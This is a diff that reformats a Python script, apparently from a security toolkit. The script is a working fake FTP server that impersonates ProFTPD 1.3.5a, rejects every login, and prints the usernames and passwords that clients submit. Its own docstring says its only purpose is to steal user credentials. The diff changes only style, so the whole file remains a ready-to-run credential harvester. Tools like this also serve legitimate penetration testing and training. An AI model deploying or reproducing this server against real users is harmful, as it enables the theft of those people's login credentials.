@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 
 import asyncio
-import click
 import os
 import pwd
 import ssl
+
+import click
 
 
 def drop_privileges():
@@ -12,12 +13,12 @@ def drop_privileges():
     if os.getuid() != 0:
         return
 
-    if 'SUDO_UID' not in os.environ:
+    if "SUDO_UID" not in os.environ:
         return
 
-    pwnam = pwd.getpwuid(int(os.environ['SUDO_UID']))
+    pwnam = pwd.getpwuid(int(os.environ["SUDO_UID"]))
 
-    print('Dropping privileges and going to user', pwnam.pw_name)
+    print("Dropping privileges and going to user", pwnam.pw_name)
 
     # Remove group privileges
     os.setgroups([])
@@ -34,71 +35,82 @@ def drop_privileges():
 
 class ServerFTP(asyncio.Protocol):
 
-
     def connection_made(self, transport):
         self.transport = transport
         self.username = None
         self.password = None
-        self.valid_cmds = ['USER', 'PASS']
-        self.address = transport.get_extra_info('peername')
-        self.transport.write(b'220 ProFTPD 1.3.5a Server (ProFTPD Server)\n')
-        print('Accepted connection from {}'.format(self.address))
-
+        self.valid_cmds = ["USER", "PASS"]
+        self.address = transport.get_extra_info("peername")
+        self.transport.write(b"220 ProFTPD 1.3.5a Server (ProFTPD Server)\n")
+        print("Accepted connection from {}".format(self.address))
 
     def data_received(self, data):
-        #self.transport.write(data)
+        # self.transport.write(data)
 
-        cmd = data.decode().split(' ')[0].strip().upper()
+        cmd = data.decode().split(" ")[0].strip().upper()
 
         if cmd not in self.valid_cmds:
-            self.transport.write('500 {} not understood\n'.format(cmd).encode())
+            self.transport.write("500 {} not understood\n".format(cmd).encode())
             return True
 
-        if cmd == 'USER':
-            username = data.decode().split(' ')[1].strip()
+        if cmd == "USER":
+            username = data.decode().split(" ")[1].strip()
             if username:
                 self.username = username
-                self.transport.write('331 Password required for {}\n'.format(username).encode())
+                self.transport.write(
+                    "331 Password required for {}\n".format(username).encode()
+                )
             else:
-                self.transport.write('500 USER: command requires a parameter\n'.encode())
+                self.transport.write(
+                    "500 USER: command requires a parameter\n".encode()
+                )
 
             return True
 
-        if cmd == 'PASS':
-            password = data.decode().split(' ')[1].strip()
+        if cmd == "PASS":
+            password = data.decode().split(" ")[1].strip()
             if not self.username:
-                self.transport.write(b'530 Please login first\n')
+                self.transport.write(b"530 Please login first\n")
                 return True
 
             if not password:
-                self.transport.write(b'530 Login incorrect.\n')
+                self.transport.write(b"530 Login incorrect.\n")
                 return True
 
             self.password = password
-            self.transport.write(b'530 Login incorrect.\n')
+            self.transport.write(b"530 Login incorrect.\n")
 
-            if self.username.lower() == 'anonymous':
-                print('Anonymous login.')
+            if self.username.lower() == "anonymous":
+                print("Anonymous login.")
             else:
-                print('Credentials collected from {}! {} {}'.format(self.address[0], self.username, self.password))
+                print(
+                    "Credentials collected from {}! {} {}".format(
+                        self.address[0], self.username, self.password
+                    )
+                )
 
             return True
 
-
     def connection_lost(self, exc):
         if exc:
-            print('Client {} error: {}'.format(self.address, exc))
+            print("Client {} error: {}".format(self.address, exc))
         else:
-            print('Client {} closed socket'.format(self.address))
+            print("Client {} closed socket".format(self.address))
 
 
 @click.command()
-@click.option('-a', 'address', default=None, help='Address to bind (default: all)')
-@click.option('-p', 'port', default=21, help='Which port to use (default: 21)')
-@click.option('--ssl', 'enable_ssl', is_flag=True, default=False, help='Enable SSL/TLS (default: False)')
-@click.option('--ssl-cert', 'ssl_cert', default=None, help='SSL/TLS Cert file')
-@click.option('--ssl-key', 'ssl_key', default=None, help='SSL/TLS Key file')
-@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
+@click.option("-a", "address", default=None, help="Address to bind (default: all)")
+@click.option("-p", "port", default=21, help="Which port to use (default: 21)")
+@click.option(
+    "--ssl",
+    "enable_ssl",
+    is_flag=True,
+    default=False,
+    help="Enable SSL/TLS (default: False)",
+)
+@click.option("--ssl-cert", "ssl_cert", default=None, help="SSL/TLS Cert file")
+@click.option("--ssl-key", "ssl_key", default=None, help="SSL/TLS Key file")
+@click.option("-v", "verbose", is_flag=True, default=False, help="Verbose")
 def cmd_server_ftp(address, port, enable_ssl, ssl_cert, ssl_key, verbose):
     """Basic fake FTP server, whith the only purpose to steal user credentials.
 
@@ -118,7 +130,7 @@ def cmd_server_ftp(address, port, enable_ssl, ssl_cert, ssl_key, verbose):
     if enable_ssl:
 
         if not (ssl_cert and ssl_key):
-            print('Please, specify --ssl-cert and --ssl-key to enable SSL/TLS')
+            print("Please, specify --ssl-cert and --ssl-key to enable SSL/TLS")
             return False
 
         ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
@@ -126,11 +138,18 @@ def cmd_server_ftp(address, port, enable_ssl, ssl_cert, ssl_key, verbose):
         ssl_context.load_cert_chain(ssl_cert, ssl_key)
 
     loop = asyncio.get_event_loop()
-    coro = loop.create_server(ServerFTP, host=address, port=port, ssl=ssl_context, reuse_address=True, reuse_port=True)
+    coro = loop.create_server(
+        ServerFTP,
+        host=address,
+        port=port,
+        ssl=ssl_context,
+        reuse_address=True,
+        reuse_port=True,
+    )
     server = loop.run_until_complete(coro)
     drop_privileges()
 
-    print('Listening on port {}'.format(port))
+    print("Listening on port {}".format(port))
 
     try:
         loop.run_forever()
@@ -139,6 +158,6 @@ def cmd_server_ftp(address, port, enable_ssl, ssl_cert, ssl_key, verbose):
 
     loop.close()
 
-if __name__ == '__main__':
-    cmd_server_ftp()
 
+if __name__ == "__main__":
+    cmd_server_ftp()
